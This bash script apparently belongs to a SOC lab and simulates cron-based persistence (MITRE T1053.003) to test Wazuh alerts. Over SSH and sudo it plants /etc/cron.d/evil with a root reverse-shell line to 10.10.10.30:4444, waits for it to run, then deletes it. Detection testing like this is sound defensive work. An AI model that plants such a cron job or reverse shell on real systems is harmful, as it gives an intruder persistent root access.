#!/bin/bash
# Cron Persistence Attack Simulation
# Target: Ubuntu Agent (10.10.10.20)
# Requires: Root access on target (via SSH with sudo)
# Expected Wazuh Rules: 100004 (custom), 530 (built-in)
# MITRE: T1053.003 (Cron)

set -e

TARGET="10.10.10.20"
USER="socadmin"
CRON_FILE="/etc/cron.d/evil"
CRON_COMMAND='* * * * * root /bin/bash -c "bash -i >& /dev/tcp/10.10.10.30/4444 0>&1"'

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${YELLOW}[*] Cron Persistence Attack Simulation${NC}"
echo -e "${YELLOW}[*] Target: $TARGET${NC}"
echo -e "${YELLOW}[*] Cron file: $CRON_FILE${NC}"
echo ""

# Check if target is reachable
if ! ping -c 1 -W 2 "$TARGET" > /dev/null 2>&1; then
    echo -e "${RED}[!] Target $TARGET is not reachable${NC}"
    exit 1
fi

# Check SSH connectivity
echo -e "${GREEN}[*] Testing SSH connection...${NC}"
if ! ssh -o BatchMode=yes -o ConnectTimeout=5 "$USER@$TARGET" "echo 'SSH OK'" 2>/dev/null; then
    echo -e "${RED}[!] SSH key authentication not configured for $USER@$TARGET${NC}"
    exit 1
fi

# Check sudo on target
echo -e "${GREEN}[*] Checking sudo access...${NC}"
if ! ssh "$USER@$TARGET" "sudo -n true 2>&1; echo \$?" | grep -q "0"; then
    echo -e "${RED}[!] Passwordless sudo not configured${NC}"
    exit 1
fi

echo -e "${YELLOW}[*] This will trigger Wazuh rules: 100004, 530${NC}"
echo -e "${YELLOW}[*] MITRE: T1053.003 (Cron)${NC}"
echo ""

# Create malicious cron job
echo -e "${GREEN}[*] Creating malicious cron job...${NC}"
ssh "$USER@$TARGET" "echo '$CRON_COMMAND' | sudo tee $CRON_FILE"

# Verify cron was created
echo -e "${GREEN}[*] Verifying cron job...${NC}"
ssh "$USER@$TARGET" "sudo cat $CRON_FILE"

# Wait for cron to potentially execute
echo -e "${YELLOW}[*] Waiting 65 seconds for cron to execute...${NC}"
sleep 65

# Cleanup
echo -e "${GREEN}[*] Cleaning up...${NC}"
ssh "$USER@$TARGET" "sudo rm -f $CRON_FILE"
ssh "$USER@$TARGET" "sudo cat $CRON_FILE 2>/dev/null || echo 'Cron file removed'"

echo ""
echo -e "${GREEN}[*] Attack simulation completed${NC}"
echo ""
echo -e "${GREEN}[*] Check Wazuh Dashboard for alerts:${NC}"
echo -e "    https://10.10.10.12:5601"
echo -e "    Filter: rule.id: 100004 OR 530"
echo -e "    MITRE: T1053.003"